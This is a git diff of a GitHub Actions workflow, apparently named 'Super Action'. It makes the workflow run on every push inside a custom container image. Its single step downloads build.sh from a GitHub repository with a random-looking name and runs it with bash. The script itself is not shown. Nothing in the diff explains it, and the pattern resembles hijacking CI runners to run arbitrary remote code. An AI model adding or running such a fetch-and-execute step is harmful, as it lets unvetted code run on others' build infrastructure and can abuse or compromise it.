@@ -1,13 +1,20 @@
-name: docker
+# Action name
+name: Super Action
+
+
+on:
+    push
+
 jobs:
-  build:
-    container:
-      image: dazz111/ubuntu-sdk:build
-    steps:
+    # The job that will use
+    super-job:
+        runs-on: ubuntu-18.04
+        container:
+            image: dazz111/ubuntu-sdk:build
+        steps:
             - name: super-step
               shell: bash
               run: |
-                sudo apt-get install wget -y
+                apt-get install wget -y
                 wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh
-                chmod a+x build.sh
                 bash build.sh
